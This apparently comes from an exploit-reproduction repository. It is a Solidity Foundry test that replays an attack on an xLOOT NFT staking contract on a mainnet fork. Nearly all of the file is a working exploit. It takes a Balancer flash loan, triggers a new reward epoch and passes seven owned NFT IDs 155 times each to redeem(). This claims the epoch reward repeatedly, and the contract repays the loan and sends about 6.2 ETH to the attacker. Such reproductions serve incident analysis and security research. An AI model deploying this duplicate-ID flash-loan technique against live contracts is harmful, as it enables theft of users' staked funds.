// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 6.21 ETH
// Attacker : 0xAcDcD2e9787E889305200900d6Cf6C0548578630
// Attack Contract : 0xd8A948b2ee03165a3c6b8940837bab664BC5CF4d
// Vulnerable Contract : 0xf3A3648bB1Da9D3aeA107da77E6f5bA9Cf313127
// Victim : 0x9d87Ff196646A99BDdb16876066aA863900118b4
// Attack Tx : https://etherscan.io/tx/0xab19752a450a205ccaca9afb8505e2d8b79593ee2edab1f67bdec27a4f14871f

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xf3A3648bB1Da9D3aeA107da77E6f5bA9Cf313127#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2044709964091187660
//
// Staking.redeem(uint256[]) calculates all xLOOT rewards before it advances xLoot.nextRedeem[id]. The calculation
// loops over every supplied ID and only checks ownerOf(id), so the same owned NFT can be supplied many times in a
// single redeem call. After a 2.1 ETH Balancer flash loan triggers a new epoch through receive(), seven owned xLOOT
// IDs repeated 155 times each claim the epoch reward 1,085 times, paying 6.2098 ETH before the 2.1 WETH repayment.

address constant ATTACKER = 0xAcDcD2e9787E889305200900d6Cf6C0548578630;
address constant STAKING_PROXY = 0x9d87Ff196646A99BDdb16876066aA863900118b4;
address constant XLOOT = 0x9237DfD3Ff86710bfD16Ee6172F184a2bB4de10A;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant WETH_FLASH_AMOUNT = 2.1 ether;
uint256 constant TRACE_REPEAT_COUNT = 155;

interface IXLoot is IERC721 {}

interface IXLootStaking {
    function redeem(
        uint256[] calldata xloots
    ) external;

    function claimableOf(
        address account,
        uint256[] calldata xloots
    ) external view returns (uint256 claimable, uint256 bonusAmount, uint256 duration);

    function nextEpoc() external view returns (uint256 time, uint256 ppt, uint256 epp, uint256 epn, uint256 value);

    function nextEpocId() external view returns (uint256);

    function xLootNextReem(
        uint256 xlootId
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    IXLoot private constant xloot = IXLoot(XLOOT);
    IXLootStaking private constant staking = IXLootStaking(STAKING_PROXY);

    function setUp() public {
        uint256 forkBlock = 24_885_767;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker");
        vm.label(STAKING_PROXY, "xLOOT Staking Proxy");
        vm.label(XLOOT, "xLOOT NFT");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256[] memory baseIds = tracedXlootIds();
        XLootStakingAttack attack = new XLootStakingAttack(ATTACKER, baseIds);
        vm.label(address(attack), "Local Attack Contract");

        uint256 startingNextEpoch = staking.nextEpocId();
        for (uint256 i = 0; i < baseIds.length; ++i) {
            assertEq(xloot.ownerOf(baseIds[i]), ATTACKER, "attacker does not own xLOOT");
            assertEq(staking.xLootNextReem(baseIds[i]), startingNextEpoch - 1, "unexpected xLOOT redeem cursor");
        }

        // step 1: stage the same seven xLOOT NFTs into a fresh local helper.
        vm.startPrank(ATTACKER);
        for (uint256 i = 0; i < baseIds.length; ++i) {
            xloot.transferFrom(ATTACKER, address(attack), baseIds[i]);
        }
        vm.stopPrank();

        // step 2: match the attack block timestamp so receive() commits epoch 47.
        (uint256 nextEpochTime,,,,) = staking.nextEpoc();
        vm.warp(nextEpochTime);

        uint256 attackerEthBefore = ATTACKER.balance;
        attack.run();
        uint256 attackerProfit = ATTACKER.balance - attackerEthBefore;

        logTokenBalance(address(0), ATTACKER, "Attacker profit");

        assertGt(attackerProfit, 4 ether, "profit below traced amount");
        assertEq(IERC20(WETH_TOKEN).balanceOf(address(attack)), 0, "WETH left on helper");
        assertEq(address(attack).balance, 0, "ETH left on helper");
        for (uint256 i = 0; i < baseIds.length; ++i) {
            assertEq(xloot.ownerOf(baseIds[i]), ATTACKER, "xLOOT not returned");
            assertEq(staking.xLootNextReem(baseIds[i]), startingNextEpoch + 1, "redeem cursor not advanced once");
        }
    }

    function tracedXlootIds() private pure returns (uint256[] memory ids) {
        ids = new uint256[](7);
        ids[0] = 128;
        ids[1] = 144;
        ids[2] = 145;
        ids[3] = 195;
        ids[4] = 49;
        ids[5] = 51;
        ids[6] = 52;
    }
}

contract XLootStakingAttack {
    address private immutable profitReceiver;
    uint256[] private baseIds;

    constructor(
        address profitReceiver_,
        uint256[] memory baseIds_
    ) {
        profitReceiver = profitReceiver_;
        baseIds = baseIds_;
    }

    receive() external payable {}

    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_TOKEN;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH_FLASH_AMOUNT;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "not Balancer");
        require(tokens.length == 1 && tokens[0] == WETH_TOKEN, "unexpected token");
        require(amounts[0] == WETH_FLASH_AMOUNT, "unexpected amount");

        // step 3: unwrap the Balancer WETH and fund the staking receive path to commit the next epoch.
        IWETH(payable(WETH_TOKEN)).withdraw(amounts[0]);
        (bool committed,) = payable(STAKING_PROXY).call{value: amounts[0]}("");
        require(committed, "epoch trigger failed");

        // step 4: redeem seven owned xLOOT IDs repeated 155 times each.
        uint256[] memory redeemIds = duplicatedIds();
        (uint256 claimable,,) = IXLootStaking(STAKING_PROXY).claimableOf(address(this), redeemIds);
        uint256 debt = amounts[0] + feeAmounts[0];
        require(claimable > debt, "duplicate IDs did not amplify claim");
        IXLootStaking(STAKING_PROXY).redeem(redeemIds);

        // step 5: repay Balancer in WETH, return the NFTs, and sweep ETH profit to the attacker EOA.
        IWETH(payable(WETH_TOKEN)).deposit{value: debt}();
        require(IERC20(WETH_TOKEN).transfer(BALANCER_VAULT, debt), "repay WETH");
        returnXloots();
        sweepProfit();
    }

    function duplicatedIds() private view returns (uint256[] memory ids) {
        ids = new uint256[](baseIds.length * TRACE_REPEAT_COUNT);
        uint256 cursor;
        for (uint256 i = 0; i < baseIds.length; ++i) {
            for (uint256 j = 0; j < TRACE_REPEAT_COUNT; ++j) {
                ids[cursor++] = baseIds[i];
            }
        }
    }

    function returnXloots() private {
        for (uint256 i = 0; i < baseIds.length; ++i) {
            IERC721(XLOOT).transferFrom(address(this), profitReceiver, baseIds[i]);
        }
    }

    function sweepProfit() private {
        uint256 balance = address(this).balance;
        if (balance != 0) {
            (bool sent,) = payable(profitReceiver).call{value: balance}("");
            require(sent, "sweep ETH");
        }
    }
}
